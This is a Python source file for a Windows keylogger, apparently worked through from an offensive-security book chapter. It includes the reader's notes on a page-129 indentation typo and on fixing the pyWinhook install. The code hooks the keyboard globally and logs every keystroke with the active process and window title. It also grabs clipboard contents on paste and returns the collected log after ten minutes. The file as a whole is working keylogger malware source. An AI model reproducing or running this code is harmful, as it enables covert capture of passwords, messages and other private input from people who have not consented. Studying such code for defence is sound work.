#!/usr/bin/env/python
'''
Keylogging for Fun and Keystrokes (Windows)
Page 128
#########################################################################################
Note: typo on page 129: code block on the top half of the page shows 8 spaces indent,
should be 4 spaces (to continue get_current_process method)

#########################################################################################
Requires:  pythoncom, resolved with "pip3 install pypiwin32"

#########################################################################################
Requires: pyWinhook (https://pypi.org/project/pyWinhook/)

Note: pyWinhook fails to install with error:

Installing collected packages: pyWinhook
  DEPRECATION: pyWinhook is being installed using the legacy 'setup.py install' method, because it does not have a 'pyproject.toml'
  and the 'wheel' package is not installed. pip 23.1 will enforce this behaviour change. A possible replacement is to enable the
  '--use-pep517' option. Discussion can be found at https://github.com/pypa/pip/issues/8559
  Running setup.py install for pyWinhook ... error
  error: subprocess-exited-with-error

Error with: ---use-pep517

Failed to build pyWinhook
ERROR: Could not build wheels for pyWinhook, which is required to install pyproject.toml-based projects

----------------------------------------------------------------------------------------------------
Update: after "pip install swig", pyWinhook install fails with:

      swig.exe -python -o pyWinhook/cpyHook_wrap.c pyWinhook/cpyHook.i
      error: Microsoft Visual C++ 14.0 or greater is required. Get it with "Microsoft C++ Build Tools":
      https://visualstudio.microsoft.com/visual-cpp-build-tools/
      [end of output]
##############################################################################################
After installing "Visual Studio Build Tools" on test machine: same error
After insatlling "Visual Studio with C++"

####################################################################################
Error with swig.exe not found, even though 'scripts' was in the path.
Resolved by running from directory where swig.exe is located ?

$ cd ......\Python311\scripts
$ pip install pyWinhook
Successfully installed pyWinhook-1.6.2

'''

from ctypes import byref, create_string_buffer, c_ulong, windll
from io import StringIO

import os
import pythoncom
import pyWinhook as pyHook
import sys
import time
import win32clipboard

TIMEOUT = 60*10

class KeyLogger:
    def __init__(self):
        self.current_window = None

    def get_current_process(self):
        hwnd = windll.user32.GetForegroundWindow()
        pid = c_ulong(0)
        windll.user32.GetWindowThreadProcessId(hwnd, byref(pid))
        process_id = f'{pid.value}'

        executable = create_string_buffer(512)
        h_process = windll.kernel32.OpenProcess(0x400|0x10, False, pid)
        windll.psapi.GetModuleBaseNameA(
            h_process, None, byref(executable), 512)

        window_title = create_string_buffer(512)
        windll.user32.GetWindowTextA(hwnd, byref(window_title), 512)
        try:
            self.current_window = window_title.value.decode()
        except UnicodeDecodeError as e:
            print(f'{e}: window name unknown')

        print('\n', process_id, executable.value.decode(), self.current_window)
        windll.kernel32.CloseHandle(hwnd)
        windll.kernel32.CloseHandle(h_process)


    def myKeystroke(self, event):
        if event.WindowName != self.current_window:
            self.get_current_process()
        if 32 < event.Ascii < 127:
            print(chr(event.Ascii), end='')
        else:
            ''' Non-alpha, such as CTRL, ALT, ESC, etc. '''
            if event.Key == 'V':
                win32clipboard.OpenClipboard()
                value = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                print(f'[PASTE] - {value}')
            else:
                print(f'{event.Key}')
        return True

def run():
    save_stdout = sys.stdout
    sys.stdout = StringIO()
    kl = KeyLogger()
    hm = pyHook.HookManager()
    hm.KeyDown = kl.myKeystroke
    hm.HookKeyboard()
    while time.thread_time() < TIMEOUT:
        pythoncom.PumpWaitingMessages()

    log = sys.stdout.getvalue()
    sys.stdout = save_stdout
    return log

if __name__ == '__main__':
    print(run())
    print('done.')